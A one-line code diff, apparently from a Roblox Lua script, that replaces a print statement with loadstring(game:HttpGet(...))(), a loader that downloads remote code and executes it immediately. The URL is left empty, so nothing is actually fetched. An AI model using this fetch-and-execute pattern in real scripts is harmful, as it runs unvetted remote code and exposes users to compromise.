@@ -1,1 +1,1 @@
-print("TH3KEN By")
+loadstring(game:HttpGet("",true))()
